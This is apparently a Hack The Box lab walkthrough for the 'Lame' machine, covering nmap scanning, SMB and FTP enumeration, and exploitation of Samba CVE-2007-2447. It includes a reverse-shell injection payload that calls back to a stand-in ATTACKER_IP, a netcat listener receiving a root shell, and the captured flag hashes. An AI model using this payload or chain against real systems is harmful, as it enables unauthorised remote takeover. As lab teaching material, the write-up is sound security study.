---
layout: default
title:  "Hack The Box Walkthrough: Lame"
date:   2024-01-06 09:00:00 +0000
categories: HTB CTF walkthrough smb samba CVE-2007-2447
---


## Introduction
## Samba vulnerability CVE-2007-2447
CVE-2007-2447 is a remote command injection vulnerability in Samba 3.0.0-3.0.25rc3 caused by a lack of input sanitization. It allows remote attackers to run commands by injecting backticked commands into the username parameter. These commands are not sanitized and are appended to a hardcoded call to ```/bin/sh sh -c /etc/samba/scripts/mapscript.sh```. A reverse shell command can be achieved by injecting a payload such as ```/bin/bash -i >& /dev/tcp/ ATTACKER_IP/6666 0>&1``` as the username. The leading ```/``` in the payload is used as a delimiter for the domain field in smbclient.
[CVE-2007-2447 Explained] (https://0x00sec.org/t/cvexplained-cve-2007-2447/22748)

## RECON
The victim machine has the IP: ```10.129.22.206```. The attack machine has the IP: ```10.10.14.212```

Starting with an enumeration of the available port we scan the TCP ports using nmap. We will also scan for all UDP ports. Once these scans are complete, we will run nmap again on the discovered TCP ports using version detection scripts.

* SYN scan (-sS) is the default scan type. It can be performed quickly, scanning thousands of ports per second on a fast network not hampered by restrictive firewalls. It is also relatively unobtrusive and stealthy since it never completes TCP connections.
* When the --min-rate option is given Nmap will do its best to send packets as fast as or faster than the given rate.
* -sV enables version detection. Version detection interrogates those ports to determine more about what is actually running. The nmap-service-probes database contains probes for querying various services and match expressions to recognize and parse responses. Nmap tries to determine the service protocol, the application name, the version number, hostname, device type, the OS family (e.g. Windows, Linux) and other miscellaneous details.
* -sC Performs a script scan using the default set of scripts in the Nmap Scripting Engine (NSE). Some of the scripts in this category are considered intrusive and should not be run against a target network without permission.
* -oN requests that normal output be directed to the given filename.
```bash
┌──(downeg㉿tholia)-[~/htb/boxes/lame]
└─$sudo nmap -sS -p- --min-rate 10000 -oN scans/nmap_tcp 10.129.22.206
Starting Nmap
Nmap scan report for 10.129.22.206
Host is up (0.080s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3632/tcp open  distccd

Nmap done: 1 IP address (1 host up) scanned in 13.82 seconds

┌──(downeg㉿tholia)-[~/htb/boxes/lame]
└─$</span> sudo nmap -sU -p- --min-rate 10000 -oN scans/nmap_udp 10.129.22.206
Starting Nmap
Nmap scan report for 10.129.22.206
Host is up (0.088s latency).
Not shown: 65531 open|filtered udp ports (no-response)
PORT     STATE  SERVICE
22/udp   closed ssh
139/udp  closed netbios-ssn
445/udp  closed microsoft-ds
3632/udp closed distcc

Nmap done: 1 IP address (1 host up) scanned in 14.05 seconds

┌──(downeg㉿tholia)-[~/htb/boxes/lame]
└─$sudo nmap -p 21,22,139,445,3632 -sV -sC -oN scans/nmap_tcp_scripts 10.129.22.206
Starting Nmap 7.94SVN
Nmap scan report for 10.129.22.206
Host is up (0.035s latency).

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 10.10.14.212
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey:
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery:
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name:
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2024-01-08T07:09:40-05:00
|_clock-skew: mean: 2h28m31s, deviation: 3h32m11s, median: -1m31s

Service detection performed.
Nmap done: 1 IP address (1 host up) scanned in 55.32 seconds

┌──(downeg㉿tholia)-[~/htb/boxes/lame]
└─$
```

## OS VERSION DETECTION
We can check the OS version by searching for ```OpenSSH 4.7p1 Debian 8ubuntu1``` on the launchpad.net site.
Launchpad is a web application and website that allows users to develop and maintain software, particularly open-source software. It is developed and maintained by Canonical Ltd.

OS detection search = ```site: launchpad.net OpenSSH 4.7p1 8ubuntu1```

From this search we find out that OpenSSH 1:4.7p1-8ubuntu1 was used in Ubuntu Hardy Heron.
Hardy is the second Long Term Support ("LTS") release of Ubuntu. Hardy was delivered in April 2008 on the normal six-month Ubuntu cycle. It was designated 8.04 LTS.

[https://launchpad.net/ubuntu/+source/openssh/1:4.7p1-8ubuntu1.1] (https://launchpad.net/ubuntu/+source/openssh/1:4.7p1-8ubuntu1.1)
[https://launchpad.net/ubuntu/hardy] (https://launchpad.net/ubuntu/hardy)

## SERVICE ENUMBERATION
```bash
PORT     STATE SERVICE      VERSION
21/tcp   open  ftp          vsftpd 2.3.4
22/tcp   open  ssh          OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
139/tcp  open  netbios-ssn  Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn  Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd      distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
```
### FTP - TCP 21
We can log in anonymously to the FTP server but there are no files listed.

```bash
┌──(downeg㉿tholia)-[~/htb/boxes/lame]
└─$ftp 10.129.22.206
Connected to 10.129.22.206.
220 (vsFTPd 2.3.4)
Name (10.129.22.206:downeg): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -al
229 Entering Extended Passive Mode (|||48357|).
150 Here comes the directory listing.
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 .
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 ..
226 Directory send OK.
ftp> quit
```

vsftpd 2.3.4 is vulnerable to the famous backdoor (CVE-2011-2523) where a shell will be opened on TCP port 6200 on the host if a username contains the :) smileyface characters at the end.
[https://www.cve.org/CVERecord?id=CVE-2011-2523] (https://www.cve.org/CVERecord?id=CVE-2011-2523)

```bash
┌──(downeg㉿tholia)-[~/htb/boxes/lame]
└─$ searchsploit vsftpd 2.3.4
-------------------------------------------------------- ---------------------
Exploit Title                                          |  Path
-------------------------------------------------------- ---------------------
vsftpd 2.3.4 - Backdoor Command Execution               | unix/remote/49757.py
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)  | unix/remote/17491.rb
-------------------------------------------------------- ---------------------
Shellcodes: No Results
Papers: No Results
┌──(downeg㉿tholia)-[~/htb/boxes/lame]
└─$</span>
```

## SAMBA - TCP 445
Server Message Block (SMB) is a client-server protocol that regulates access to files and entire directories and other network resources such as printers, routers, or interfaces released for the network. The main application area of the protocol has been the Windows operating system. With the free software project Samba, there is also a solution that enables the use of SMB in Linux and Unix distributions and thus cross-platform communication via SMB.

For enumeration of the SMB shares we use smbmap and rackmapexec, which show the tmp share available with RW permissions.

```bash
┌──(downeg㉿tholia)-[~/htb/boxes/lame]
└─$</span> <span class="command"> smbmap -H 10.129.22.206
        SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                        https://github.com/ShawnDEvans/smbmap
[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)

[+] IP: 10.129.22.206:445       Name: 10.129.22.206             Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        tmp                                                     READ, WRITE     oh noes!
        opt                                                     NO ACCESS
        IPC$                                                    NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))
        ADMIN$                                                  NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))

┌──(downeg㉿tholia)-[~/htb/boxes/lame]
└─$ crackmapexec smb 10.129.22.206 -u '' -p '' --shares
SMB         10.129.22.206   445    LAME             [*] Unix (name:LAME) (domain:hackthebox.gr) (signing:False) (SMBv1:True)
SMB         10.129.22.206   445    LAME             [+] hackthebox.gr\:
SMB         10.129.22.206   445    LAME             [+] Enumerated shares
SMB         10.129.22.206   445    LAME             Share           Permissions     Remark
SMB         10.129.22.206   445    LAME             -----           -----------     ------
SMB         10.129.22.206   445    LAME             print$                          Printer Drivers
SMB         10.129.22.206   445    LAME             tmp             READ,WRITE      oh noes!
SMB         10.129.22.206   445    LAME             opt
SMB         10.129.22.206   445    LAME             IPC$                            IPC Service (lame server (Samba 3.0.20-Debian))
SMB         10.129.22.206   445    LAME             ADMIN$                          IPC Service (lame server (Samba 3.0.20-Debian))
┌──(downeg㉿tholia)-[~/htb/boxes/lame]
└─$
```
We can use smbclient to connect to the share, however there are no useful files in the share.

```bash
┌──(downeg㉿tholia)-[~/htb/boxes/lame]
└─$ smbclient --no-pass //10.129.22.206/tmp
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> dir
    .                                   D        0  Mon Jan  8 12:55:56 2024
    ..                                 DR        0  Sat Oct 31 07:33:58 2020
    orbit-makis                        DR        0  Mon Jan  8 11:25:31 2024
    5585.jsvc_up                        R        0  Mon Jan  8 08:50:30 2024
    .ICE-unix                          DH        0  Mon Jan  8 08:49:16 2024
    vmware-root                        DR        0  Mon Jan  8 08:50:29 2024
    .X11-unix                          DH        0  Mon Jan  8 08:49:42 2024
    gconfd-makis                       DR        0  Mon Jan  8 11:25:31 2024
    .X0-lock                           HR       11  Mon Jan  8 08:49:42 2024
    vgauthsvclog.txt.0                  R     1600  Mon Jan  8 08:49:14 2024

                7282168 blocks of size 1024. 5385248 blocks available
smb: \>
```

Checking the SAMBA version for vulnerabilities we find it is vulnerable to a 'username' map script command execution exploit.

```bash
┌──(downeg㉿tholia)-[~/htb/boxes/lame]
└─$ searchsploit samba 3.0.20
-------------------------------------------------------------------------------- --------------------------
    Exploit Title                                                                  |  Path
-------------------------------------------------------------------------------- --------------------------
Samba 3.0.10 < 3.3.5 - Format String / Security Bypass                          | multiple/remote/10095.txt
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)| unix/remote/16320.rb
Samba < 3.0.20 - Remote Heap Overflow                                           | linux/remote/7701.txt
Samba < 3.6.2 (x86) - Denial of Service (PoC)                                   | linux_x86/dos/36741.py
-------------------------------------------------------------------------------- ---------------------------
Shellcodes: No Results
Papers: No Results
┌──(downeg㉿tholia)-[~/htb/boxes/lame]
└─$
```

This vulnerability in samba is known as CVE-2007-2447 and allows remote attackers to run commands via the username parameter in Samba 3.0.0–3.0.25rc3.
[https://0x00sec.org/t/cvexplained-cve-2007-2447/22748] (https://0x00sec.org/t/cvexplained-cve-2007-2447/22748)
[https://www.cve.org/CVERecord?id=CVE-2007-2447] (https://www.cve.org/CVERecord?id=CVE-2007-2447)

## EXPLOITATION
### FTP - TCP 21 - vsftp 2.3.4 - CVE-2011-2523

There are a number of Python scripts that can be downloaded to exploit this vulnerability.
[https://github.com/padsalatushal/CVE-2011-2523/blob/main/exploit.py] (https://github.com/padsalatushal/CVE-2011-2523/blob/main/exploit.py)
[https://github.com/HerculesRD/vsftpd2.3.4PyExploit"] (https://github.com/HerculesRD/vsftpd2.3.4PyExploit)

These exploits should open port 6200 on the exploited host and allow us to connect to a shell on the port. In testing these scripts we find that we are unable to connect.
While the version reported in the nmap scan shows as vulnerable, we are unable to exploit this route.

### SAMBA - TCP 445 - CVE-2007-2447
There are a number of Python scripts available to exploit this vulnerability.
[https://github.com/xbufu/CVE-2007-2447] (https://github.com/xbufu/CVE-2007-2447)
[https://github.com/Ziemni/CVE-2007-2447-in-Python] (https://github.com/Ziemni/CVE-2007-2447-in-Python)
Using these scripts we can get a reverse shell on our preferred port. Here we use netcat to listen on port 6666 for the connection.
We started a bash shell on the attack box before starting up netcat as we will want to upgrade the reverse shell to a fully interactive TTY and the “stty raw -echo” command does not function very well with zsh which is now the default shell in Kali Linux.
Once our reverse shell from one of the above scripts is connected back we can upgrade the shell to interactive using 
```bash
python -c 'import pty;pty.spawn(/bin/bash)';
Ctrl+Z
stty raw -echo; fg
```
The reverse shell is running as root so we do not need to perform any privilege escalation on this box and we can find and view all flags.

```bash 
┌──(downeg㉿tholia)-[~/htb/boxes/lame]
└─$ /bin/bash -p
┌──(downeg㉿tholia)-[~/htb/boxes/lame]
└─$nc -lnvp 6666</span>
listening on [any] 6666 ...
connect to [10.10.14.212] from (UNKNOWN) [10.129.22.206] 48479
python -c 'import pty;pty.spawn("/bin/bash")'
root@lame:/# ^Z
[1]+  Stopped                 nc -lnvp 6666
┌──(downeg㉿tholia)-[~/htb/boxes/lame]
└─$ stty raw -echo;fg
nc -lnvp 6666
root@lame:/# ls
bin    etc         initrd.img.old  mnt        root  tmp      vmlinuz.old
boot   home        lib             nohup.out  sbin  usr
cdrom  initrd      lost+found      opt        srv   var
dev    initrd.img  media           proc       sys   vmlinuz
root@lame:/# cat `find / -name user.txt`
4725c27cf2adbca76580d99bb867bc7b
root@lame:/# cat `find / -name root.txt`
2daa373250e6f300d3808b2cbc4fec3f
root@lame:/#
```

The end.
